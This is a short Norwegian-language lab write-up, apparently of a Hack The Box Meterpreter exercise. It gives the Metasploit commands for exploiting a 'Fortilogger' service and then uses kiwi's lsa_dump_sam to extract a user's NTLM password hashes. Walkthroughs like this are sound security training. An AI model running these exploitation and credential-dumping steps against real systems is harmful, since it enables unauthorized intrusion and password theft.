# Meteperter

## Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

For å løse denne gjør jeg en rask nmap scan på domenet. Jeg finner prosessen jeg kan exploite, som er "Fortilogger"

<br>

Start metasploit med `msfconsole -q`


`search fortilogger`

`use 0`

`set RHOTS *ip*`

`set LHOST tun0`

`run`

<br>

![picture1](https://user-images.githubusercontent.com/83395536/194724526-3ab048e5-345d-493a-9a4b-5a5f0b61d166.png)
<br>

Spørsmålet ønsker at vi skal finne ut hva brukernavet er til brukeren vi nettop kom innpå. For å finne det ut kjører vi bare `getuid` for å få brukernavnet siden maskinen vi kom inn på er Windows. Dette kan vi se med at det er en C:\Windows
<br>
<br>

## Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.

Vi lærte i modulen hvordan vi får NTLM passord, og det er derfor jeg velger å kjøre en `load kiwi` for å få disse ekstra kommandoene. 

<br>

For å få passord hashene kjører jeg `lsa_dump_sam`, og skroller ned til jeg finner brukeren "htb-student". 

<br>

![hack2](https://user-images.githubusercontent.com/83395536/194724535-dc59360b-0745-4899-9e90-252eeff910e7.png)

<br>
![hack3](https://user-images.githubusercontent.com/83395536/194724534-4c0c569a-65c7-430c-b289-9a2c12f39181.png)
<br>

Gratulerer, du har hacket en maskin der du fikk NTLM passordene til en bruker!

